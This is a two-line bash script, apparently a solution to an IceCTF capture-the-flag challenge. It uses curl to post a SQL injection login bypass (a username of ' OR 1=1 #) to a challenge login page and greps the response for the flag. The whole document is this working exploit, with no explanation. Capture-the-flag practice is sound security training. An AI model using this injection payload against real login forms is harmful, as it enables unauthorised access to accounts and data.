#!/bin/bash

curl flagstorage.vuln.icec.tf/login.php --data 'username='"'"' OR 1=1 #'|grep -o IceCTF{.*}
